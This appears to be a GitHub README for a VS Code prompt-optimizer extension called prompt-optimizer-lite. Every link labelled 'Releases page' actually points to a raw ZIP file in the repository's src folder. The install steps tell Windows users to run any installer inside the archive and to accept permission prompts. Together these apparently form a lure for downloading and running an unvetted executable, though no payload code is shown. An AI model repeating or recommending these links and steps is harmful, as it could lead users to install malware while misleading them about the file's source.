# 🧩 prompt-optimizer-lite - Fast prompt cleanup in VS Code

[![Download prompt-optimizer-lite](https://img.shields.io/badge/Download%20Release-blue-grey?style=for-the-badge)](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)

## 🚀 What it does

prompt-optimizer-lite is a VS Code extension that helps you improve prompts without leaving your editor. It works with the chat model you already use in VS Code. If that fails, it falls back to a local Python optimizer, then to a built-in template.

Use it to:

- clean up rough prompts
- make instructions clearer
- shorten long text
- turn messy ideas into direct requests
- keep working even when the chat model does not respond

## 📥 Download

Visit this page to download and install the app package for Windows:

[Download from GitHub Releases](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)

On the Releases page, look for the latest version and download the Windows file.

## 🪟 Install on Windows

1. Open the [GitHub Releases page](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)
2. Download the latest Windows release file
3. If the file is a ZIP archive, right-click it and choose **Extract All**
4. Open the extracted folder
5. If you see an installer, run it
6. If you see a VS Code extension file, open VS Code and install it from the Extensions view
7. Restart VS Code if asked

If Windows asks for permission, choose **Yes**.

## ✨ Main features

### 💬 Chat participant
Type `@promptopt` in VS Code Chat to optimize a prompt in conversation. This is the easiest way to use it when you already have Chat open.

### 🖱️ Editor command
Select text in the editor and run the optimize command. You can also right-click and use the context menu option.

### ✍️ Manual input
If no text is selected, the extension opens an input box. Paste or type a prompt there and optimize it.

### 📋 Multiple output choices
After optimization, you can:

- replace the selected text
- insert the result at the cursor
- copy the result to the clipboard
- open the result as a Markdown preview

### 🔄 Three-layer fallback
prompt-optimizer-lite tries three paths in this order:

1. current chat model
2. local Python optimizer
3. built-in template

This helps the tool keep working when one step fails.

## 🛠️ How to use it

### In VS Code Chat
1. Open VS Code
2. Open Chat
3. Type `@promptopt`
4. Enter your prompt
5. Review the optimized result

### From the editor
1. Open a file
2. Select a prompt or note
3. Run the optimize command
4. Choose how you want the result applied

### Without selecting text
1. Run the optimize command
2. Type or paste your prompt in the box
3. Pick where the result should go

## 🧭 What you need

You need:

- Windows 10 or Windows 11
- Visual Studio Code
- Internet access for the Marketplace install
- Python only if the fallback optimizer is used

The extension is light and fits normal desktop use.

## 🔧 Setup in Visual Studio Code

If you use the Marketplace version:

1. Open VS Code
2. Open the Extensions panel
3. Search for **Prompt Optimizer Lite**
4. Install it
5. Restart VS Code if needed

If you use the release download:

1. Download the latest release from the [Releases page](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)
2. Open VS Code
3. Install the extension from the downloaded file if your release package includes one
4. Reload VS Code

## 📝 When to use it

Use prompt-optimizer-lite when you want to:

- make a prompt easier to understand
- turn a vague request into a clear one
- prepare prompts for chat assistants
- keep a prompt short and focused
- save time rewriting the same request

It works well for plain tasks like:

- writing support requests
- drafting content prompts
- cleaning up instructions
- rewording notes into a better prompt

## 🔍 Example

Before:

- make this better and more clear for the AI

After:

- Rewrite this prompt so it is clear, short, and specific

## 🧩 How fallback helps

If the chat model does not respond, the extension tries the local Python optimizer. If that is not available, it uses a built-in template. This gives you a working result even when the first option fails.

## ⌨️ Short usage flow

1. Open VS Code
2. Open Chat or select text in the editor
3. Run prompt optimization
4. Review the improved prompt
5. Copy it, insert it, or replace the original text

## 📌 Where to get the latest version

[Download the latest release](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)

## 🧠 Tips for better results

- write one prompt at a time
- keep the request direct
- include the goal first
- remove extra words before optimizing
- use the output as a starting point and edit it if needed

## 📂 Common file types you may see

Depending on the release, you may see:

- a ZIP file
- a VS Code extension package
- a Windows installer
- support files for the local Python fallback

If you download a ZIP file, extract it before opening the contents

## 🧯 Basic troubleshooting

### VS Code does not show the extension
- restart VS Code
- check the Extensions panel again
- make sure the file finished downloading

### The optimize command does not run
- open Chat or select text first
- try the command again
- restart VS Code

### The result looks plain
- give the prompt more detail
- make the request more specific
- remove long background text before optimizing

### The fallback does not appear
- check whether Python is installed
- try again after restarting VS Code
- use the built-in template result if needed

## 📦 Release download steps

1. Open the [Releases page](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)
2. Find the newest release
3. Download the Windows package
4. Open or extract the file
5. Install or load it in VS Code
6. Start using `@promptopt` or the editor command